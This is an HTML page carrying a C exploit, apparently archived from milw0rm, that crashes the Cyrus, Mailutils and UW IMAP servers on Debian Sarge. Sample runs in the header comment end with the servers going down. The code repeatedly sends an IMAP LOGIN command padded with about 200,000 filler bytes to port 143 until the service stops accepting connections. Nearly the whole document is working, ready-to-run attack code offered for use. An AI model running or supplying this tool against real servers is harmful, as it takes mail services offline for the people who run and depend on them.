<html><head><title>Debian Sarge Multiple IMAP Server Denial of Service Exploit</title></head><pre>/*

Debian Sarge Multiple IMAP Server DoS (debianimapers.c)
Jeremy Brown [0xjbrown41@gmail.com/http://jbrownsec.blogspot.com]

Testing Cyrus IMAPd:

bash$ ./debianimapers 192.168.0.189

.....

39 tries and imapd goes down! Mission Complete!

Testing Mailutil's IMAP4d:

bash$ ./debianimapers 192.168.0.189

.....

38 tries and imapd goes down! Mission Complete!

Testing UW-IMAPd:

bash$ ./debianimapers 192.168.0.189

.....

39 tries and imapd goes down! Mission Complete!

bash$

*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;

#define COUNT 100
#define SIZE  100000

char imaplogin[]  = &quot;A0001 LOGIN&quot;;

int main(int argc, char *argv[])
{

    char buffer[SIZE], imapped[SIZE+30];
    int i, port = 143;

    memset(buffer, 0x41, sizeof(buffer));
    memset(imapped, 0, sizeof(imapped));

    snprintf(imapped, sizeof(imapped)-1, &quot;%s %s %s\r\n\r\n&quot;, imaplogin, buffer, buffer);
    
if(argc &lt; 2)
{

     printf(&quot;\nDebian Sarge Multiple IMAP Server DoS&quot;);
     printf(&quot;\nJeremy Brown [0xjbrown41@gmail.com/http://jbrownsec.blogspot.com]\n&quot;);

     printf(&quot;\nUsage %s &lt;host&gt;\n\n&quot;, argv[0]);

return 0;
}

     printf(&quot;\nDebian Sarge Multiple IMAP Server DoS&quot;);
     printf(&quot;\nJeremy Brown [0xjbrown41@gmail.com/http://jbrownsec.blogspot.com]\n&quot;);

     int sock;
     struct sockaddr_in remote;

     remote.sin_family = AF_INET;
     remote.sin_port = htons(port);
     remote.sin_addr.s_addr = inet_addr(argv[1]);

if((sock = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0) { printf(&quot;Error: socket()\n&quot;); return -1; }
if(connect(sock,(struct sockaddr *)&amp;remote, sizeof(struct sockaddr)) &lt; 0) { printf(&quot;Error: connect(%s:%d)\n&quot;, argv[1], port); return -1; }

     close(sock);

     printf(&quot;\nUsually takes ~1-2 minutes, LAN/Internet and connection speed will make time vary...\n&quot;);

for(i = 0; i &lt;= COUNT; i++)
{

     struct sockaddr_in remote;
     remote.sin_family = AF_INET;
     remote.sin_port = htons(port);
     remote.sin_addr.s_addr = inet_addr(argv[1]);

if((sock = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0) { printf(&quot;Error: socket()\n&quot;); return -1; }

sleep(1);

if(connect(sock,(struct sockaddr *)&amp;remote, sizeof(struct sockaddr)) &lt; 0) { printf(&quot;\n%d tries and imapd goes down! Mission Complete!\n\n&quot;, i); return -1; }

     int len = sizeof(imapped);
     send(sock, imapped, len, 0);
     close(sock);

}

return 0;
}

// milw0rm.com [2008-09-22]</pre></html>